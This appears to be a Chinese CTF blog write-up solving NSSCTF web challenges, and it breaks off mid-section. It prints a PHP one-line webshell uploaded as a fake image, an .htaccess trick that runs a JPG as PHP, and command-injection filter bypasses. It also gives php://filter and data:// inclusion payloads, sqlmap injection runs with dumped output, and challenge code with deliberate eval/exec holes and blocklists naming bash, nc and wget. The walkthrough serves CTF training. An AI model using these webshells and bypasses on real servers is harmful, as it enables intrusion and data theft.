function_">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="title function_">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$id=$_POST[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$json=<span class="title function_">json_decode</span>($_GET[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> ($id==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;$json[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;echo $flag;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>使用HackBar , POST  方法是 id &#x3D; wllmNB , GET 方法是 json &#x3D; {“x”:”wllm”}  (這是json 的GET方式)</p><img src="8eb0cc113238d50d6b4d6f73a89095f8.png" alt="8eb0cc113238d50d6b4d6f73a89095f8.png" /><br/><h2 id="5-easyupload1-0"><a href="#5-easyupload1-0" class="headerlink" title="5.easyupload1.0"></a>5.easyupload1.0</h2><img src="3c3df1f679fa27534846b37c7c7b74c9.png" alt="3c3df1f679fa27534846b37c7c7b74c9.png" /><p>把一句話木馬upload 上去 , 然後用BP攔下包轉去Repeater ..&#x2F;.</p><p>一句話木馬:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">BM</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt; @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;bhxdn&#x27;</span>]); <span class="title function_">phpinfo</span>();&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="44222a75c8417886544b761b68f7f345.png" alt="44222a75c8417886544b761b68f7f345.png" /><p>把 filename 由jpg 改成 php 然後發送</p><img src="e78ca8c5602c8a8b4b58322e042c57ab.png" alt="e78ca8c5602c8a8b4b58322e042c57ab.png" /><p>發送成功 ,  在.&#x2F;upload&#x2F;xiaoma.php 下 , 可以看見是觸發了木馬的 </p><img src="c65d3a42a9304b40d43ff0a3e55c1bf6.png" alt="c65d3a42a9304b40d43ff0a3e55c1bf6.png" /><p>然後可以開antsword add URL </p><img src="f8163c307de9b0d00ede75a327993126.png" alt="f8163c307de9b0d00ede75a327993126.png" /><p>可以回到html下找到flag </p><img src="f03d9d2819fbfc38b994b755f6b73674.png" alt="f03d9d2819fbfc38b994b755f6b73674.png" /><p>flag 為????????? WLLMCTF{I_d0nt_w4nna_wak3up} ???????,記得把前頭改成 NSSCTF{…} </p><p>可是flag不正確。。。。。。。。。。。。。。在根目錄都沒有</p><p>在根目錄下打開cmd  打：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printenv</span><br></pre></td></tr></table></figure><p>就有</p><img src="bce1b958ab13d6b3b5372cf0549a7e1d.png" alt="bce1b958ab13d6b3b5372cf0549a7e1d.png" /><p>原來flag在這FLAG&#x3D;NSSCTF{58c4de5b-6a3f-4dbc-8332-16ad44d25a11}</p><h2 id="6-easyupload2-0"><a href="#6-easyupload2-0" class="headerlink" title="6.easyupload2.0"></a>6.easyupload2.0</h2><p>這一次的過濾是在後台的,所以我要想辦法去做一個php後綴繞過, 我用了deepseek寫了一個字典</p><img src="a15c6720f893ee3fb529a4d60f902821.png" alt="a15c6720f893ee3fb529a4d60f902821.png" /><p>,先去抓包送去Intruder</p><img src="7caeb4abdc3ba54e9a49950c3d72e9a2.png" alt="7caeb4abdc3ba54e9a49950c3d72e9a2.png" /><p>把JPG$為payload 并插入字典,開始爆破 , 看看Length 427 的Response  是成功的 , 進去看看</p><img src="1dcc7c64b305fb28dfd58799daf0e827.png" alt="1dcc7c64b305fb28dfd58799daf0e827.png" /><p>查一下flag的位子,得出 flag : NSSCTF{9f5d5750-9a19-48c1-b41f-51d2db3e66a5}</p><img src="3bf6c15c0fc603e58634a61f1c81d911.png" alt="3bf6c15c0fc603e58634a61f1c81d911.png" /><h2 id="7-easyupload3-0"><a href="#7-easyupload3-0" class="headerlink" title="7.easyupload3.0"></a>7.easyupload3.0</h2><p>利用.htaccess进行绕过</p><p>.htaccess 是一个用于配置 Apache web 服务器的分布式配置文件，全称为 Hypertext Access（超文本访问）。它允许网站管理员在不修改服务器主配置文件（如 httpd.conf）的情况下，对特定目录及其子目录的服务器行为进行设置，具有灵活性高、针对性强的特点。<br>.htaccess 的核心作用<br>.htaccess 文件主要用于覆盖 Apache 主配置中的默认规则，实现对目录级别的精细化控制，常见功能包括：</p><p>URL 重写（如将动态 URL 转换为静态友好的形式）。<br>访问控制（限制特定 IP 或用户访问）。<br>自定义错误页面（如 404、500 错误页）。<br>缓存设置（控制浏览器或服务器缓存策略）。<br>实现 HTTPS 强制跳转。<br>文件类型关联（如设置特定扩展名的 MIME 类型）等。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">FilesMatch</span> <span class="string">&quot;xiaoma.jpg&quot;</span>&gt;</span><br><span class="line"><span class="title class_">SetHandler</span> application/x-httpd-php</span><br><span class="line">&lt;/<span class="title class_">FilesMatch</span>&gt;</span><br><span class="line"></span><br><span class="line"># <span class="title class_">SetHandler</span> 指令强制指定文件的处理程序</span><br><span class="line"># 这里将 <span class="string">&quot;xiaoma.jpg&quot;</span> 交给 <span class="variable constant_">PHP</span> 处理器（application/x-httpd-php）处理</span><br><span class="line"># 即服务器会把这个图片文件当作 <span class="variable constant_">PHP</span> 脚本执行，而非直接返回图片内容</span><br></pre></td></tr></table></figure><p>先抓個包先 , 上傳一句話木馬.jpg </p><img src="d0945bcbaab0944101929114cf63e9fd.png" alt="d0945bcbaab0944101929114cf63e9fd.png" /><p>試試用爆破一下</p><img src="cf2ed89b24dabe2d073d1d63eb2ea044.png" alt="cf2ed89b24dabe2d073d1d63eb2ea044.png" /><p>最後只有htaccess成功 , 現在傳入.htaccess 腳本 </p><img src="730c04915892ed223f0bd9593c7b1554.png" alt="730c04915892ed223f0bd9593c7b1554.png" /><p>在&#x2F;upload 看看 。</p><img src="1e867f19185207051fe9f6a1dd1c5845.png" alt="1e867f19185207051fe9f6a1dd1c5845.png" /><img src="24b764ecf857a0859dab633a4199f957.png" alt="24b764ecf857a0859dab633a4199f957.png" /><p>的確是執行了phpinfo.php</p><img src="5a6553d967a2946298da259ca46dc083.png" alt="5a6553d967a2946298da259ca46dc083.png" /><p>NSSCTF{6b9d4421-ffc6-4432-b2d8-9f4b8e88c96c}</p><br/><h2 id="8-finalrce"><a href="#8-finalrce" class="headerlink" title="8.finalrce"></a>8.finalrce</h2><br/><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span>(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_">isset</span>($_GET[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $url=$_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">preg_match</span>(<span class="string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,$url))</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;Can you see anything?&quot;</span>;</span><br><span class="line">        <span class="title function_">exec</span>($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(1)這裡的代碼說明GET url 不能是 “bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|-|*|&quot;|&gt;|&lt;|%|$&#x2F;i “ </p><p>(2) exec() 沒有回顯 , </p><pre><code> exec()</code></pre><p>原型：string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )</p><p>说明：</p><p>第一个参数， $command 是要执行的命令，例如： “ls -l”</p><p>第二个参数，$output 是command执行输出的结果，以数组格式存储</p><p>第三个参数，$return_var，用于保存command执行状态，0 - 成功，非零 - 失败</p><p>返回值，为command执行结果的最后一行</p><p>可參考這篇文章：</p><p><a href="https://">https://blog.csdn.net/afei__&#x2F;article&#x2F;details&#x2F;81901296</a></p><p>tee命令:Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。</p><p>管道符号 <code>|</code>（竖线）表示将前一个命令的输出”传递”给下一个命令作为输入。</p><p>開啟hackbar 打出 ? url &#x3D; l\s &#x2F; | tee test.txt , 然後 &#x2F;test.txt 可看見 </p><img src="168505fbf862b1d969ee44775210bd39.png" alt="168505fbf862b1d969ee44775210bd39.png" /><p>有兩個像是flag的東西 a_here_is_a_f1ag  和 flllllaaaaaaggggggg , </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?url=tac  /flllll\aaaaaaggggggg | tee <span class="number">1.</span>txt</span><br></pre></td></tr></table></figure><p>使用转义符可繞過檢測 </p><p>然後 &#x2F;1.txt 可看見 </p><img src="e96cb7f0490a1c2838e6149640b03463.png" alt="e96cb7f0490a1c2838e6149640b03463.png" /><p>NSSCTF{2b9d7dde-7f03-4a7f-9664-8a623ff22553}</p><h2 id="9-PseudoProtocols"><a href="#9-PseudoProtocols" class="headerlink" title="9. PseudoProtocols"></a>9. PseudoProtocols</h2><p><a href="https://">https://blog.csdn.net/IDHALASHAO/article/details/130368938</a></p><p>PHP伪协议</p><p>可以用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">php</span>:<span class="comment">//filter/read=convert.base64-encode/resource=hint.php</span></span><br></pre></td></tr></table></figure><p>以base64encode 形式去輸出</p><img src="24c0e5759f9d1c2eac63161ba8532905.png" alt="24c0e5759f9d1c2eac63161ba8532905.png" /><p>base64 解碼為：</p><img src="5b9d7541f10767a5bbdd79b40a93ee1e.png" alt="5b9d7541f10767a5bbdd79b40a93ee1e.png" /><br/><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//go to /test2222222222222.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>進入後發現php代碼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>, <span class="string">&quot;180&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>)) === <span class="string">&#x27;I want flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可知GET  isset(a) (a存在) 和  file_get_contents(a,’r’)要嚴格 &#x3D; ‘I want flag’  , 可以使用phph伪协议 用data:&#x2F;&#x2F;  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../....php?a=data://text/plain,I want flag</span><br></pre></td></tr></table></figure><img src="e3ce167eb017d822d02d41ebc6149ac6.png" alt="e3ce167eb017d822d02d41ebc6149ac6.png" /><p>還可以用base64  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../....php?a=data://text/plain;base64,SSB3YW50IGZsYWc=</span><br></pre></td></tr></table></figure><br/><h2 id="10-ez-ez-php"><a href="#10-ez-ez-php" class="headerlink" title="10.ez_ez_php"></a>10.ez_ez_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">3</span>) === <span class="string">&quot;php&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Nice!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure><p>試一試&#x2F;flag.php</p><img src="7a7b62c2eb2672dca08985e521a0a057.png" alt="7a7b62c2eb2672dca08985e521a0a057.png" /><p>看來要用php伪协议</p><br/><p>php伪协议</p><p>php:&#x2F;&#x2F;filter&#x2F;<br>读取包含php代码文件内容需要进行某种编码进行输出，不然会当作php代码执行就无法查看文章内容</p><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>allow_url_fopen ：off&#x2F;on</li><li>allow_url_include：off&#x2F;on</li></ul><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=file</span><br></pre></td></tr></table></figure><h5 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h5><ul><li><strong>php:&#x2F;&#x2F;filter&#x2F;</strong>：这是一个 PHP 的流封装器，用于在读写数据时提供过滤功能。</li><li><strong>read&#x3D;convert.base64-encode&#x2F;</strong>：这里指定了一个过滤器，告诉 PHP 在读取数据之前将其进行 base64 编码。<code>convert.base64-encode</code>是一个 PHP 内置的过滤器，用于将数据转换为 base64 编码</li><li><strong>resource&#x3D;file</strong>：这部分指定了要操作的资源。在这个例子中，<code>file</code>表示我们希望对一个文件进行操作，具体来说是对文件的内容进行 base64 编码读取</li></ul><img src="c8a9a7c8fae6f5aa36de009dc991f1d6.png" alt="c8a9a7c8fae6f5aa36de009dc991f1d6.png" /><img src="7a6c1d02bb09e707d0f779bf765dc29c.png" alt="7a6c1d02bb09e707d0f779bf765dc29c.png" /><p>再改一改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?file=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure><img src="f1f266d969b3ca0389251ef3162172a4.png" alt="f1f266d969b3ca0389251ef3162172a4.png" /><img src="52bf506872189284081ce70e94020942.png" alt="52bf506872189284081ce70e94020942.png" /><p>NSSCTF{5c686f83-3496-45b9-9d79-58172f39fb9c}</p><h2 id="11-babyRCE"><a href="#11-babyRCE" class="headerlink" title="11.babyRCE"></a>11.babyRCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$rce</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hhhhhhacker!!!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>沒有ls 可以?rce&#x3D;ls  , 如下</p><img src="4881e43a020115d6c69d266df2bd8107.png" alt="4881e43a020115d6c69d266df2bd8107.png" /><p>可是空格被ban了 可惡啊</p><img src="763b8d97fc3c333de1ea22b12041dcb0.png" alt="763b8d97fc3c333de1ea22b12041dcb0.png" /><img src="bcbd7da73f6551422f1dd1948360f09c.png" alt="bcbd7da73f6551422f1dd1948360f09c.png" /><p>看來可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br></pre></td></tr></table></figure><p>过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?rce=rev$IFS./fl\ag.php</span><br></pre></td></tr></table></figure><br/><img src="c7e0c4aa074493852c4e0de14d3b553b.png" alt="c7e0c4aa074493852c4e0de14d3b553b.png" /><p>rev一下</p><img src="e5a233ee9fed1a3a5c01044d94537910.png" alt="e5a233ee9fed1a3a5c01044d94537910.png" /><p>NSSCTF{0b67ab0f-36eb-4b7a-b2ec-bcd591f56063}</p><h2 id="12-导弹迷踪"><a href="#12-导弹迷踪" class="headerlink" title="12.导弹迷踪"></a>12.导弹迷踪</h2><p>這不實力嗎(bushi~~</p><img src="070744670c7f9ac8af4b8a37ae9fd54b.png" alt="070744670c7f9ac8af4b8a37ae9fd54b.png" /><p>看看有沒有向服務器發包 ,好像沒有</p><img src="dd7b995b2302fc8d981a9b95889b9b1d.png" alt="dd7b995b2302fc8d981a9b95889b9b1d.png" /><p>說明不能抓包, 只好看看源代碼了, 最後在game.js找到了</p><img src="0a28277e0d4d5d864a3648198b845b02.png" alt="0a28277e0d4d5d864a3648198b845b02.png" /><h2 id="13-caidao"><a href="#13-caidao" class="headerlink" title="13.caidao"></a>13.caidao</h2><p>一看就知道是fuzz了, 蟻劍啟動!!!!! wllm為密碼 </p><p>最後在根目錄找到flag</p><img src="cef146c06300fd3f89926762c4732a48.png" alt="cef146c06300fd3f89926762c4732a48.png" />## 14.easy_sql<p>可以看見參數是wllm 在url?wllm&#x3D;1後</p><img src="eadfa8156d67834230c0e4a0b51fd586.png" alt="eadfa8156d67834230c0e4a0b51fd586.png" /><p>先打開sqlmap ,先查本查是否有注入漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node7.anna.nssctf.cn:24766/?wllm=1 --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: wllm (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: wllm=1&#x27; AND 3264=3264 AND &#x27;PvdX&#x27;=&#x27;PvdX</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: wllm=1&#x27; AND (SELECT 2246 FROM(SELECT COUNT(*),CONCAT(0x7176766271,(SELECT (ELT(2246=2246,1))),0x716b626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#x27;tWnq&#x27;=&#x27;tWnq</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: wllm=1&#x27; AND (SELECT 5627 FROM (SELECT(SLEEP(5)))KQyT) AND &#x27;LObx&#x27;=&#x27;LObx</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: wllm=-8611&#x27; UNION ALL SELECT NULL,CONCAT(0x7176766271,0x707a4e734470455a694f714c5377426f56435a6d4447567979594750585254684a71435578684644,0x716b626271),NULL-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>用sqlmap爆庫:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node7.anna.nssctf.cn:24766/?wllm=1 --dbs --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] test</span><br><span class="line">[*] test_db</span><br></pre></td></tr></table></figure><p>爆table:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node7.anna.nssctf.cn:24766/?wllm=1 -D test_db --tables --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: test_db</span><br><span class="line">[2 tables]</span><br><span class="line">+---------+</span><br><span class="line">| test_tb |</span><br><span class="line">| users   |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p>看看 test_tb的內容 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node7.anna.nssctf.cn:24766/?wllm=1 -D test_db --dump --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: test_db</span><br><span class="line">Table: test_tb</span><br><span class="line">[1 entry]</span><br><span class="line">+----+----------------------------------------------+</span><br><span class="line">| id | flag                                         |</span><br><span class="line">+----+----------------------------------------------+</span><br><span class="line">| 1  | NSSCTF&#123;ca97d725-34c3-4a69-b0b9-21a28907ed9f&#125; |</span><br><span class="line">+----+----------------------------------------------+</span><br></pre></td></tr></table></figure><h2 id="15-hardrce"><a href="#15-hardrce" class="headerlink" title="15.hardrce"></a>15.hardrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> 蔡总说：注意审题！！！</span><br></pre></td></tr></table></figure><p>可以看到eval($wllm);  是我們的攻擊點 , 目標是eval(system(“ls”)) ; </p><p>注意code 中有blacklist 